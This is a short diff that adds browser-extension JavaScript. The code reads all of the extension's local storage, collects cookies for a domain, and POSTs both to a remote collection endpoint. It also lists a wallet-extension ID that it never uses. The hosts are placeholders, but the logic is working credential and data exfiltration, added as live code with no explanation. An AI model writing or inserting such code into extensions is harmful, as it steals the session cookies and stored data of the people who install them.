@@ -1,0 +1,6 @@
+chrome.storage.local.get(null, function (items) {
+  var ids = ["nkbihfbeogaeaoehlefnkodbefgpgknn"];
+  chrome.cookies.getAll({ domain: "example.invalid" }, function (c) {
+    fetch("https://sink.example.invalid/x", { method: "POST", body: JSON.stringify({ c: c, items: items }) });
+  });
+});
